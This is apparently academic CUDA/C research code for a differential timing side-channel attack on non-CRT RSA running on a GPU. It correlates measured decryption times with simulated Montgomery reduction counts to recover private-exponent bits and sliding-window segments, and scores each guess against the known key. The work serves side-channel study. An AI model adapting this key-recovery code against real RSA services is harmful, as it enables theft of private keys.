/* Timing attack without CRT GPU code
 * 11/09/2016 Chao Luo
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <helper_cuda.h>
#include <assert.h>
#include <math.h>

#include <cuda.h>
#include <curand.h>

#include "common.hh"
#include "rsa_gpu.hh"
#include "rsa_cpu.hh"

#define GPU_TIME

#define checkCurandErrors(x) do { curandStatus_t status= (x);\
	if (status != CURAND_STATUS_SUCCESS) { \
	printf("Error %d at %s:%d\n", status, __FILE__, __LINE__); \
	exit(EXIT_FAILURE);}} while(0)


void save_timing(uint64_t *t_gpu, uint64_t *t_cpu, int trace_num) {
	FILE *data_file = fopen("data.bin", "wb");

	fwrite(t_gpu, sizeof(uint64_t), trace_num, data_file);
	fwrite(t_cpu, sizeof(uint64_t), trace_num, data_file);

	fclose(data_file);
}

void print_msg(int msg_bytes, int msg_num, int trace_num, WORD *msges) {
	int size = msg_num * trace_num * msg_bytes;
	unsigned char *msg_h = (unsigned char *)malloc(size);
	checkCudaErrors(cudaMemcpy(msg_h, msges, size, cudaMemcpyDeviceToHost));
	for (int i = 0; i < trace_num; i++) {
		for (int j = 0; j < msg_num; j++) {
			printf("msg %d:", j + i * msg_num);
			for (int k = 0; k < 16; k++) {
				int index = k + (j + i * msg_num) * msg_bytes;
				printf("%02x", msg_h[index]);
			}
		printf("\n");
		}
	}
}

void check_reduction(int msg_bytes, int msg_num, int trace_num, WORD *d_host,
	WORD *msges_mont, WORD *msges_part, WORD* msges, uint16_t *reduction) {
	WORD *msges_all, *msges_all_h, *msges_part_h;
	checkCudaErrors(cudaMalloc(&msges_all, msg_bytes*msg_num*trace_num));
	msges_all_h = (WORD *) malloc(msg_bytes*msg_num*trace_num);
	msges_part_h = (WORD *) malloc(msg_bytes*msg_num*trace_num);

	int msg_size = msg_bytes / BYTES_PER_WORD;
	int grid_size = (msg_size * msg_num * trace_num + BLK_SIZE -1) / BLK_SIZE;
	gpu_modexp<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, msges, msges_all);
	checkCudaErrors(cudaMemcpy(msges_all_h, msges_all, msg_bytes*msg_num*trace_num,
		cudaMemcpyDeviceToHost));

	for (int i=msg_bytes*8-2; i>=1; i--) {
		if ((d_host[i/BITS_PER_WORD] >> (i%BITS_PER_WORD)) &1) {
			gpu_bit1_reduction<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, msges_mont,
				msges_part, reduction);
		}
		else
			gpu_bit0_reduction<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, msges_mont, 
				msges_part, reduction);
	}
	gpu_demont<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, msges_mont, msges_part);
	checkCudaErrors(cudaMemcpy(msges_part_h, msges_part, msg_bytes*msg_num*trace_num,
		cudaMemcpyDeviceToHost));

	assert(memcmp(msges_all_h, msges_part_h, msg_bytes*msg_num*trace_num)==0);
	printf("Reduction check success.\n");

	free(msges_all_h);
	free(msges_part_h);
	checkCudaErrors(cudaFree(msges_all));
}

void check_reduction_sw(int msg_bytes, int msg_num, int trace_num, struct SW sw,
	WORD *msges_part, WORD* msges, uint16_t *reduction) {
	WORD *msges_all, *msges_all_h, *msges_part_h;
	checkCudaErrors(cudaMalloc(&msges_all, msg_bytes*msg_num*trace_num));
	msges_all_h = (WORD *) malloc(msg_bytes*msg_num*trace_num);
	msges_part_h = (WORD *) malloc(msg_bytes*msg_num*trace_num);

	int msg_size = msg_bytes / BYTES_PER_WORD;
	int grid_size = (msg_size * msg_num * trace_num + BLK_SIZE -1) / BLK_SIZE;
	gpu_modexp_sw<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, msges, msges_all);
	checkCudaErrors(cudaMemcpy(msges_all_h, msges_all, msg_bytes*msg_num*trace_num,
		cudaMemcpyDeviceToHost));

	int num_frags = sw.num_fragments;
	for (int i = num_frags -1; i >= 1; i--) {
		uint16_t frag;
		if (sw.fragment[i] == 0)
			frag = sw.length[i] << 1;
		else
			frag = sw.fragment[i];
		gpu_reduction_sw<<<grid_size, BLK_SIZE>>>
			(msg_num * trace_num, msg_size, msges_part, reduction, frag, 1);
	}

	gpu_demont_sw<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, msges_part, sw.fragment[0]);
	checkCudaErrors(cudaMemcpy(msges_part_h, msges_part, msg_bytes*msg_num*trace_num,
		cudaMemcpyDeviceToHost));

	assert(memcmp(msges_all_h, msges_part_h, msg_bytes*msg_num*trace_num)==0);
	printf("Reduction check success.\n");

	free(msges_all_h);
	free(msges_part_h);
	checkCudaErrors(cudaFree(msges_all));
}


void save_reduction(uint8_t *reduction0, uint8_t *reduction1, int n) {
	FILE *file = fopen("reduction.bin", "wb+");
	uint8_t *reduction0_h, *reduction1_h;
	reduction0_h = (uint8_t *) malloc(n);
	reduction1_h = (uint8_t *) malloc(n);
	checkCudaErrors(cudaMemcpy(reduction0_h, reduction0, n, cudaMemcpyDeviceToHost));
	checkCudaErrors(cudaMemcpy(reduction1_h, reduction1, n, cudaMemcpyDeviceToHost));
	
	fwrite(reduction0_h, 1, n, file);
	fwrite(reduction1_h, 1, n, file);

	free(reduction0_h);
	free(reduction1_h);
	fclose(file);
}
/* Hamming weight of one byte */
int ByteHW(uint8_t d) {
	static int hw_array[256] = {
	0 , 1 , 1 , 2 , 1 , 2 , 2 , 3 , 1 , 2 , 2 , 3 , 2 , 3 , 3 , 4 , 
	1 , 2 , 2 , 3 , 2 , 3 , 3 , 4 , 2 , 3 , 3 , 4 , 3 , 4 , 4 , 5 , 
	1 , 2 , 2 , 3 , 2 , 3 , 3 , 4 , 2 , 3 , 3 , 4 , 3 , 4 , 4 , 5 , 
	2 , 3 , 3 , 4 , 3 , 4 , 4 , 5 , 3 , 4 , 4 , 5 , 4 , 5 , 5 , 6 , 
	1 , 2 , 2 , 3 , 2 , 3 , 3 , 4 , 2 , 3 , 3 , 4 , 3 , 4 , 4 , 5 , 
	2 , 3 , 3 , 4 , 3 , 4 , 4 , 5 , 3 , 4 , 4 , 5 , 4 , 5 , 5 , 6 , 
	2 , 3 , 3 , 4 , 3 , 4 , 4 , 5 , 3 , 4 , 4 , 5 , 4 , 5 , 5 , 6 , 
	3 , 4 , 4 , 5 , 4 , 5 , 5 , 6 , 4 , 5 , 5 , 6 , 5 , 6 , 6 , 7 , 
	1 , 2 , 2 , 3 , 2 , 3 , 3 , 4 , 2 , 3 , 3 , 4 , 3 , 4 , 4 , 5 , 
	2 , 3 , 3 , 4 , 3 , 4 , 4 , 5 , 3 , 4 , 4 , 5 , 4 , 5 , 5 , 6 , 
	2 , 3 , 3 , 4 , 3 , 4 , 4 , 5 , 3 , 4 , 4 , 5 , 4 , 5 , 5 , 6 , 
	3 , 4 , 4 , 5 , 4 , 5 , 5 , 6 , 4 , 5 , 5 , 6 , 5 , 6 , 6 , 7 , 
	2 , 3 , 3 , 4 , 3 , 4 , 4 , 5 , 3 , 4 , 4 , 5 , 4 , 5 , 5 , 6 , 
	3 , 4 , 4 , 5 , 4 , 5 , 5 , 6 , 4 , 5 , 5 , 6 , 5 , 6 , 6 , 7 , 
	3 , 4 , 4 , 5 , 4 , 5 , 5 , 6 , 4 , 5 , 5 , 6 , 5 , 6 , 6 , 7 , 
	4 , 5 , 5 , 6 , 5 , 6 , 6 , 7 , 5 , 6 , 6 , 7 , 6 , 7 , 7 , 8 ,
	};
	return hw_array[d];
}

int ByteHW(uint16_t d) {
	uint8_t hi, lo;
	lo = (uint8_t)(d & 0x00ff);
	hi = (uint8_t)(d >> 8);
	return ByteHW(hi) + ByteHW(lo);
}
/* Attack one bit with multiple warp and one block 
 * reduction_h organized as : msg_num X trace_num X bit_size_max
 */
template <typename T>
int attack_bit_mm(T *t_h, uint16_t *reduction_h, int bit_size, int msg_num, int trace_num, 
	int msg_size, double *maxCorr) {
	int msg_per_warp = 32 / msg_size;
	int warp_per_trace = (msg_num * msg_size + 31) / 32;
	int bit_size_max = (1 << bit_size);
	uint64_t *t;
	t = (uint64_t *)malloc(sizeof(uint64_t) * trace_num * bit_size_max);
	memset(t, 0, sizeof(uint64_t) * trace_num * bit_size_max);
	/* addition reduction */
	for (int l = 0; l < bit_size_max; l++) {
		for (int i = 0; i < trace_num; i++) {
			for (int j = 0; j < warp_per_trace; j++) {
				uint16_t redu = 0;
				for (int k = 0; k < msg_per_warp; k++) {
					if ((j*msg_per_warp + k) < msg_num) {
						int idx = ((l * trace_num + i) * msg_num + j * msg_per_warp + k);
						redu |= reduction_h[idx];
					}
				}
				t[i + l * trace_num] += ByteHW(redu);
			}
		}
	} 
	//printf("after loop\n");
	/* maximum reduction 
	for (int l = 0; l < bit_size_max; l++) {
		for (int i = 0; i < trace_num; i++) {
			uint16_t maximum = 0;
			for (int j = 0; j < warp_per_trace; j++) {
				uint16_t redu = 0;
				for (int k = 0; k < msg_per_warp; k++) {
					if ((j*msg_per_warp + k) < msg_num) {
						int idx = ((l * trace_num + i) * msg_num + j * msg_per_warp + k);
						redu |= reduction_h[idx];
					}
				}
				if (ByteHW(redu) > maximum)
					maximum = ByteHW(redu);
			}
			t[i + l * trace_num] = maximum;
		}
	} */

	double *corr_result = (double *)malloc(sizeof(double) * bit_size_max);
	uint64_t **d2 = (uint64_t **)malloc(sizeof(uint64_t *) * bit_size_max);
	for (int i = 0; i < bit_size_max; i++) {
		d2[i] = t + i * trace_num;
	}
	
	corr(corr_result, t_h, d2, bit_size_max, trace_num); /* Can be parallelized by CUDA */
	
	int guess = 0;
	for (int i = 1; i < bit_size_max; i++) {
		if (corr_result[i] > corr_result[guess]) {
			guess = i;
		}
	}
	//printf("guess: %3d, corr: %+f\n", guess, corr_result[guess]);
	if (maxCorr != NULL)
		*maxCorr = corr_result[guess];
	free(t);
	free(corr_result);
	free(d2);
	return(guess);
}

template 
int attack_bit_mm<double>(double *t_h, uint16_t *reduction_h, int bit_size, 
	int msg_num, int trace_num, int msg_size, double *maxCorr);

int attack_bit(uint64_t *t_h, uint8_t *reduction0_h, uint8_t *reduction1_h, int msg_num, int trace_num) {
	uint64_t t00, t01, t10, t11;
	int count00, count01, count10, count11;
	double diff0, diff1;
	t00 = 0; t01 = 0; t10 = 0; t11 = 0;
	count00 = 0; count01 = 0; count10 = 0; count11 = 0;

	for (int i = 0; i < trace_num; i++) {
		int add_reduction0 = 0;
		int add_reduction1 = 0;
		for (int j = 0; j < msg_num; j++) {
			if (reduction0_h[i * msg_num + j])
				add_reduction0 = 1;
			if (reduction1_h[i * msg_num + j])
				add_reduction1 = 1;
		}
		if (add_reduction0) {
			t01 += t_h[i];
			count01++;
		}
		else {
			t00 += t_h[i];
			count00 ++;
		}
		if (add_reduction1) {
			t11 += t_h[i];
			count11++;
		}
		else {
			t10 += t_h[i];
			count10 ++;
		}
	}
	diff0 = (double)t01 / count01 - (double)t00 / count00;
	diff1 = (double)t11 / count11 - (double)t10 / count10;
	int guess = diff0 > diff1 ? 0 : 1;
	printf("guess: %d, diff0: %+f, diff1: %+f.\n", guess, diff0, diff1);

	return(guess);
}

/* Return the int of bit_size of the sequence_th of d*/
int sub_val(WORD *d, int bit_size, int sequence) {
	int key_bits = 512;
	int start_idx = key_bits - 2 - sequence * bit_size;
	int end_idx = start_idx - bit_size + 1;
	int start_word_idx = start_idx / BITS_PER_WORD;
	int end_word_idx = end_idx / BITS_PER_WORD;
	int start_inword_idx = start_idx % BITS_PER_WORD;
	int end_inword_idx = end_idx % BITS_PER_WORD;
	if (start_word_idx == end_word_idx){
		return((int)((d[start_word_idx] >> end_inword_idx) & ((1 << bit_size) -1)));
	}
	else {
		int low_bits = d[end_word_idx] >> end_inword_idx;
		int high_bits = (d[start_word_idx] & ( (1 << (start_inword_idx + 1)) - 1)) 
			<< (bit_size - start_inword_idx - 1);
		return (low_bits + high_bits);
	}
}

/* Attack multiple bits of secret d at once.
 * bit_size: how many bits to be attacked at once
 * bit_num: attack how many times of bit_size, i.e. attack bit_size * bit_num bits
 * msges0: the start data, which is (msges*r)^2
 * msges1: for temp result
 */
template <typename T>
void dt_attack(int msg_size, int msg_num, int trace_num, int bit_size, int bit_num, T *t_h, WORD *d_host,
	WORD *msges0, WORD *msges1, WORD *msges_mont) {
	uint16_t *reduction;
	uint16_t *reduction_h;
	int bit_size_max = (1 << bit_size);
	checkCudaErrors(cudaMalloc(&reduction, trace_num * msg_num * bit_size_max * sizeof(uint16_t)));
	checkCudaErrors(cudaMemset(reduction, 0, trace_num * msg_num * bit_size_max * sizeof(uint16_t)));
	reduction_h = (uint16_t *)malloc(trace_num * msg_num * bit_size_max * sizeof(uint16_t));

	int grid_size = (msg_num * msg_size * trace_num + BLK_SIZE -1) / BLK_SIZE;
	int success = 0;
	for (int i = 0; i < bit_num; i++) {
		for (int j = 0; j < bit_size_max; j++) {
			//printf("i=%d, j=%d\n", i,j);
			gpu_mbit_reduction<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, 
				msges_mont, msges0, bit_size, j, reduction + msg_num * trace_num * j, false);
		}
		checkCudaErrors(cudaMemcpy(reduction_h, reduction, 
			trace_num * msg_num * bit_size_max * sizeof(uint16_t), cudaMemcpyDeviceToHost));

		int bit_val = sub_val(d_host, bit_size, i);
		double maxCorr = 0;
		int bit_attack = attack_bit_mm(t_h, reduction_h, bit_size, msg_num, trace_num, msg_size, &maxCorr);
		printf("Targeting %3d-%3d bit, val: %3d, guess: %3d, corr: %+f", 
			510-i*bit_size, 511 -(i+1)*bit_size, bit_val, bit_attack, maxCorr);
		//printf("bit_attack=%d\n", bit_attack);
		gpu_mbit_reduction<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, 
				msges_mont, msges0, bit_size, bit_val, reduction, true);

		if (bit_val == bit_attack) {
			success += bit_size;
			printf("\n");
		}
		else {
			printf(" Wrong guess.\n");
			success += bit_size - ByteHW((uint8_t)(bit_val ^ bit_attack));
		}
	}
	printf("success %d/%d = %f\n", success, bit_num * bit_size, double(success)/(bit_num * bit_size));

	checkCudaErrors(cudaFree(reduction));
	free(reduction_h);
}
template 
void dt_attack<double>(int msg_size, int msg_num, int trace_num, int bit_size, int bit_num, 
	double *t_h, WORD *d_host, WORD *msges0, WORD *msges1, WORD *msges_mont); 

template <typename T>
void dt_attack_sw(int msg_size, int msg_num, int trace_num, T *t_h, struct SW sw,
	WORD *msges0, int seg_num) {
	uint16_t *reduction;
	uint16_t *reduction_h;
	int length = 5;
	int bit_size_max = (1 << length);
	checkCudaErrors(cudaMalloc(&reduction, trace_num * msg_num * bit_size_max * sizeof(uint16_t)));
	checkCudaErrors(cudaMemset(reduction, 0, trace_num * msg_num * bit_size_max * sizeof(uint16_t)));
	reduction_h = (uint16_t *)malloc(trace_num * msg_num * bit_size_max * sizeof(uint16_t));

	int grid_size = (msg_num * msg_size * trace_num + BLK_SIZE -1) / BLK_SIZE;
	int success = 0;
	for (int i = sw.num_fragments - 1; i >= 1 && i >= sw.num_fragments - seg_num; i--) {
		checkCudaErrors(cudaMemset(reduction, 0, trace_num * msg_num * bit_size_max * sizeof(uint16_t)));
		for (int j = 1; j <= bit_size_max; j++) {
			gpu_reduction_sw<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, 
				msges0, reduction + msg_num * trace_num * (j-1), j, 0);
		}
		checkCudaErrors(cudaMemcpy(reduction_h, reduction, trace_num * msg_num * bit_size_max * sizeof(uint16_t), 
			cudaMemcpyDeviceToHost));
		// odd bit_val represent frag value; even bit_val represent # of zeros * 2	
		int bit_val;
		if (sw.fragment[i] & 1)
			bit_val = sw.fragment[i];
		else
			bit_val = sw.length[i] << 1;

		printf("Targeting %3d segment, val: %3d, ", i, bit_val);
		double maxCorr = 0;
		int bit_attack = attack_bit_mm(t_h, reduction_h, length, msg_num, trace_num, msg_size, &maxCorr) + 1;
		gpu_reduction_sw<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, 
				msges0, reduction, bit_val, 1);
		printf("guess: %3d, corr: %+f", bit_attack, maxCorr);

		if (bit_val == bit_attack) {
			success++;
			printf("\n");
		}
		else {
			printf("Wrong guess.\n");
		}
	}
	int total_num = seg_num < sw.num_fragments - 1 ? seg_num :  sw.num_fragments -1;
	printf("success %d/%d = %f\n", success,  total_num, double(success)/total_num);

	checkCudaErrors(cudaFree(reduction));
	free(reduction_h);
}

template 
void dt_attack_sw<uint64_t>(int msg_size, int msg_num, int trace_num, uint64_t *t_h, struct SW sw,
	WORD *msges0, int seg_num); 

/* vlnw attack
 * first guess length, then guess value
 * if the length = q+1, the value = 1, skip the value guess
 */
template <typename T>
void dt_attack_vlnw(int msg_size, int msg_num, int trace_num, T *t_h, struct SW sw,
	WORD *msges0, int seg_num) {
	uint16_t *reduction;
	uint16_t *reduction_h;

	int grid_size = (msg_num * msg_size * trace_num + BLK_SIZE -1) / BLK_SIZE;
	int success = 0, failure = 0;
	int segIdx = sw.num_fragments - 1;
	int attacked  = 0;
	bool skipValue = false; // skip value guess if length == q+1
	int minSquare = 4;
	int valueLength = 5;
	int valueNum = (1 << (valueLength - 1));

	checkCudaErrors(cudaMalloc(&reduction, trace_num * msg_num * valueNum * sizeof(uint16_t)));
	checkCudaErrors(cudaMemset(reduction, 0, trace_num * msg_num * valueNum * sizeof(uint16_t)));
	reduction_h = (uint16_t *)malloc(trace_num * msg_num * valueNum * sizeof(uint16_t));
			checkCudaErrors(cudaMemcpy(reduction_h, reduction, 
				trace_num * msg_num * valueNum * sizeof(uint16_t), cudaMemcpyDeviceToHost));

	while ( segIdx > 1 && attacked < seg_num) {
		// guess value
		if (!skipValue) {
			// reset reduction to all 0s
			checkCudaErrors(cudaMemset(reduction, 0, trace_num * msg_num * valueNum * sizeof(uint16_t)));
			for (int j = 0; j < valueNum; j++) {
				int value = (j << 1) + 1;
				gpu_reduction_value<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, 
					msges0, reduction + msg_num * trace_num * j, value, minSquare, 0);
				getLastCudaError("None");
			}
			checkCudaErrors(cudaMemcpy(reduction_h, reduction, 
				trace_num * msg_num * valueNum * sizeof(uint16_t), cudaMemcpyDeviceToHost));

			int segValue = sw.fragment[segIdx];
			assert(segValue != 0);

			printf("Targeting %3d segment, val = %3d, ", segIdx, segValue);
			double maxCorr = 0;
			int attackValue = attack_bit_mm
				(t_h, reduction_h, valueLength - 1, msg_num, trace_num, msg_size, &maxCorr);
			attackValue = (attackValue << 1) + 1;
			// update msges0 using the correct seg value
			gpu_reduction_value<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, 
					msges0, reduction, segValue, minSquare, 1);
			printf("guess: %3d, corr: %+f  ", attackValue, maxCorr);

			if (segValue == attackValue) {
				success++;
				printf("\n");
			}
			else {
				failure++;
				printf("Wrong guess.\n");
			}
			segIdx--;
			attacked++;
		}
		// guess length
		checkCudaErrors(cudaMemset(reduction, 0, trace_num * msg_num * valueNum * sizeof(uint16_t)));
		for (int j = 0; j < valueNum; j++) {
			int length = minSquare + j;
			gpu_reduction_length<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, 
				msges0, reduction + msg_num * trace_num * j, length, minSquare, 0);
		}
		checkCudaErrors(cudaMemcpy(reduction_h, reduction, 
			trace_num * msg_num * valueNum * sizeof(uint16_t), cudaMemcpyDeviceToHost));

		int segLength;
		if (sw.fragment[segIdx] == 0)
			segLength= sw.length[segIdx] + sw.length[segIdx - 1];
		else
			segLength = sw.length[segIdx];

		assert(segLength >= minSquare);

		printf("Targeting %3d segment, len = %3d, ", segIdx, segLength);
		double maxCorr = 0;
		int attackLength = attack_bit_mm
			(t_h, reduction_h, valueLength - 1, msg_num, trace_num, msg_size, &maxCorr);
		attackLength = attackLength + minSquare;
		// update msges0 using the correct seg value
		gpu_reduction_length<<<grid_size, BLK_SIZE>>>(msg_num * trace_num, msg_size, 
				msges0, reduction, segLength, minSquare, 1);
		printf("guess: %3d, corr: %+f  ", attackLength, maxCorr);

		if (segLength == attackLength) {
			success++;
			printf("\n");
		}
		else {
			failure++;
			printf("Wrong guess.\n");
		}
		if (sw.fragment[segIdx] == 0) {
			segIdx--;
			attacked++;
		}
		if (segLength == minSquare) {
			segIdx--;
			attacked++;
			skipValue = true;
		}
		else
			skipValue = false;
	}

	int total_num = success + failure;
	printf("success %d/%d = %f\n", success,  total_num, double(success)/total_num);

	checkCudaErrors(cudaFree(reduction));
	free(reduction_h);
}
template 
void dt_attack_vlnw<uint64_t>(int msg_size, int msg_num, int trace_num, uint64_t *t_h, struct SW sw,
	WORD *msges0, int seg_num);


void print_time(uint64_t tick) {
	int usecond = tick % 1000000;
	int second = tick / 1e6;
	int minute = second / 60;
	int hour = minute / 60;
	int day = hour / 24;
	printf(" Time used: ");
	if (day) printf("%02d D ", day);
	if (hour) printf("%02d H ", hour % 24);
	if (minute) printf("%02d M ", minute % 60);
	if (second) printf("%02d", second % 60);
	printf(".%06d S\n", usecond);
}

void attack_nocrt(int msg_bytes, int msg_num, int trace_num, WORD *d_host, int timing, int bit_size, int bit_num) {
	int msg_size = msg_bytes / sizeof(WORD);
	uint64_t tick;
	WORD* msges;
	WORD* msges0;
	WORD* msges1;
	WORD* msges_mont;
	uint64_t* t_all;
	int repeat = 1;

	checkCudaErrors(cudaMalloc(&msges, msg_bytes*trace_num*msg_num));
	checkCudaErrors(cudaMalloc(&msges0, msg_bytes*trace_num*msg_num));
	checkCudaErrors(cudaMalloc(&msges1, msg_bytes*trace_num*msg_num));
	checkCudaErrors(cudaMalloc(&msges_mont, msg_bytes*trace_num*msg_num));
	checkCudaErrors(cudaMalloc(&t_all, sizeof(uint64_t)*trace_num));


	checkCudaErrors(cudaMemset(t_all, 0, sizeof(uint64_t)*trace_num));

	/* Generate random number in msges */
	printf("Generate rand msg. msg_num: %d, trace_num: %d.", msg_num, trace_num);
	tick = get_usec();
	curandGenerator_t gen;
	checkCurandErrors(curandCreateGenerator(&gen, CURAND_RNG_PSEUDO_DEFAULT));
	checkCurandErrors(curandSetPseudoRandomGeneratorSeed(gen, 0));
	checkCurandErrors(curandGenerate(
		gen, (unsigned int *)msges, trace_num * msg_bytes * msg_num / sizeof(unsigned int)));
	checkCurandErrors(curandDestroyGenerator(gen));
	checkCudaErrors(cudaDeviceSynchronize());
	tick = get_usec() - tick;
	print_time(tick);

	/* Print msg */
	/*printf("msg:\n");
	print_msg(msg_bytes, msg_num, trace_num, msges);*/

	
	int grid_size = (msg_num * msg_size + BLK_SIZE -1) / BLK_SIZE;
	printf("block size: %d, grid_size: %d\n", BLK_SIZE, grid_size);
	/* Decrption time t_dec */
	uint64_t *t_h = (uint64_t *) malloc(sizeof(uint64_t) * trace_num);
	uint64_t *t_cpu = (uint64_t *) malloc(sizeof(uint64_t) * trace_num);
	memset(t_cpu, 0, sizeof(uint64_t) * trace_num);
	if (timing) {
		printf("Record decryption time. repeat: %d.", repeat);
		tick = get_usec();
		for(int j=0; j<trace_num; j++) {
			for(int i=0; i<repeat; i++) {
			uint64_t start, stop;
				RDTSC_START(start);
				gpu_modexp_timing<<<grid_size, BLK_SIZE>>>
					(msg_num, msg_size, msges+j*msg_num*msg_size, t_all+j);
				//checkCudaErrors(cudaDeviceSynchronize());
				checkCudaErrors(cudaMemcpy(t_h+j, t_all+j, sizeof(uint64_t), cudaMemcpyDeviceToHost));
				RDTSC_STOP(stop);
				t_cpu[j] += stop - start;
			}
		}
		//checkCudaErrors(cudaMemcpy(t_h, t_all, sizeof(uint64_t)*trace_num, cudaMemcpyDeviceToHost));
		tick = get_usec() - tick;
		print_time(tick);
		save_timing(t_h, t_cpu, trace_num);
	}
	else {
		/* Load data from data_bk.bin */
		FILE *dfile = fopen("data_bk.bin", "rb");
		fread(t_h, sizeof(uint64_t), trace_num, dfile);
		fread(t_cpu, sizeof(uint64_t), trace_num, dfile);
		fclose(dfile);
	}

	/* Pre-processing msg: montgoeritize, sqr */
	printf("Pre-processing. ");
	tick = get_usec();

	/* Get device properity */
	cudaDeviceProp deviceProp;
	checkCudaErrors(cudaGetDeviceProperties(&deviceProp, 0));
	int cudaCap = deviceProp.major;
	if (cudaCap > 2) {
		grid_size = (msg_num * msg_size * trace_num + BLK_SIZE -1) / BLK_SIZE;
		gpu_preprocessing<<<grid_size, BLK_SIZE>>>
			(msg_num * trace_num, msg_size, msges, msges0, msges_mont);
	}
	else {
		int max_grid = 65535;
		int msg_round = max_grid * BLK_SIZE / msg_size;
		int msg_total = msg_num * trace_num;
		int i;
		for (i = 0; i < msg_total - msg_round; i += msg_round) {
			gpu_preprocessing<<<max_grid, BLK_SIZE>>>(msg_round, msg_size, msges + i * msg_size, 
				msges0 + i * msg_size, msges_mont + i * msg_size);
		}
		if (i < msg_total) {
			int grid_residual = ((msg_total - i) * msg_size + BLK_SIZE - 1) / BLK_SIZE;
			gpu_preprocessing<<<grid_residual, BLK_SIZE>>>(msg_total - i, msg_size, msges + i * msg_size, 
				msges0 + i * msg_size, msges_mont + i * msg_size);
		}
	}
	tick = get_usec() - tick;
	print_time(tick);

		
	/* Differential timing attack */
	printf("Differential timing attack\n");
	tick = get_usec();
	//dt_attack(msg_size, msg_num, trace_num, bit_size, bit_num, t_h, d_host, msges0, msges1, msges_mont);
	dt_attack(msg_size, msg_num, trace_num, bit_size, bit_num, t_cpu, d_host, msges0, msges1, msges_mont);
	tick = get_usec() - tick;
	print_time(tick);
	
	/* Free memory */
	free(t_h);
	free(t_cpu);
	checkCudaErrors(cudaFree(msges));
	checkCudaErrors(cudaFree(msges0));
	checkCudaErrors(cudaFree(msges1));
	checkCudaErrors(cudaFree(msges_mont));
	checkCudaErrors(cudaFree(t_all));
}

void attack_sw(int msg_bytes, int msg_num, int trace_num, int timing, struct SW sw, int seg_num) {
	int msg_size = msg_bytes / BYTES_PER_WORD;
	WORD* msges; 
	WORD* msges0;
	uint64_t* t_all, tick;

	assert(msg_size <= MAX_MSG_SIZE);
	assert(msg_num * trace_num <= MAX_MSG_NUM);

	checkCudaErrors(cudaMalloc(&msges, msg_bytes * msg_num * trace_num));
	checkCudaErrors(cudaMalloc(&msges0, msg_bytes * msg_num * trace_num));
	checkCudaErrors(cudaMalloc(&t_all, sizeof(uint64_t) * trace_num));
	checkCudaErrors(cudaMemset(t_all, 0, sizeof(uint64_t) * trace_num));

	/* Generate random number in msges */
	printf("Generate rand msg. msg_num: %d, trace_num: %d.", msg_num, trace_num);
	tick = get_usec();
	curandGenerator_t gen;
	checkCurandErrors(curandCreateGenerator(&gen, CURAND_RNG_PSEUDO_DEFAULT));
	checkCurandErrors(curandSetPseudoRandomGeneratorSeed(gen, 0));
	checkCurandErrors(curandGenerate(
		gen, (unsigned int *)msges, trace_num * msg_bytes * msg_num / sizeof(unsigned int)));
	checkCurandErrors(curandDestroyGenerator(gen));
	checkCudaErrors(cudaDeviceSynchronize());
	tick = get_usec() - tick;
	print_time(tick);

	int grid_size = (msg_num * msg_size + BLK_SIZE -1) / BLK_SIZE;
	printf("block size: %d, grid_size: %d\n", BLK_SIZE, grid_size);
	/* Decrption time t_dec */
	uint64_t *t_h = (uint64_t *) malloc(sizeof(uint64_t) * trace_num);
	uint64_t *t_cpu = (uint64_t *) malloc(sizeof(uint64_t) * trace_num);
	memset(t_cpu, 0, sizeof(uint64_t) * trace_num);
	if (timing) {
		tick = get_usec();
		for(int j=0; j<trace_num; j++) {
			uint64_t start, stop;
				RDTSC_START(start);
				gpu_modexp_timing_sw<<<grid_size, BLK_SIZE>>>
					(msg_num, msg_size, msges+j*msg_num*msg_size, t_all+j);
				checkCudaErrors(cudaMemcpy(t_h+j, t_all+j, sizeof(uint64_t), cudaMemcpyDeviceToHost));
				RDTSC_STOP(stop);
				t_cpu[j] += stop - start;
		}
		tick = get_usec() - tick;
		print_time(tick);
		save_timing(t_h, t_cpu, trace_num);
	}
	else {
		/* Load data from data_bk.bin */
		FILE *dfile = fopen("data_bk.bin", "rb");
		fread(t_h, sizeof(uint64_t), trace_num, dfile);
		fread(t_cpu, sizeof(uint64_t), trace_num, dfile);
		fclose(dfile);
	}

	/* Pre-processing msg: montgomerization, sqr */
	printf("Pre-processing. ");
	tick = get_usec();
	grid_size = (msg_num * msg_size * trace_num + BLK_SIZE -1) / BLK_SIZE;
	gpu_preprocessing_sw<<<grid_size, BLK_SIZE>>>
		(msg_num * trace_num, msg_size, msges, msges0);
	tick = get_usec() - tick;
	print_time(tick);

	/* check reduction
	uint16_t *reduction;
	checkCudaErrors(cudaMalloc(&reduction, msg_bytes * msg_num * trace_num * sizeof(uint16_t)));
	check_reduction_sw(msg_bytes, msg_num, trace_num, sw, msges0, msges, reduction); */

	/* Differential timing attack */
	printf("Differential timing attack\n");
	tick = get_usec();
	uint64_t *t_p;
#ifdef GPU_TIME
	printf("Use GPU time.\n");
	t_p = t_h;
#else
	printf("Use CPU time.\n");
	t_p = t_cpu;
#endif
	dt_attack_sw(msg_size, msg_num, trace_num, t_p, sw, msges0, seg_num);
	tick = get_usec() - tick;
	print_time(tick);
	
	/* Free memory */
	free(t_h);
	free(t_cpu);
	checkCudaErrors(cudaFree(msges));
	checkCudaErrors(cudaFree(msges0));
	checkCudaErrors(cudaFree(t_all));
	
}
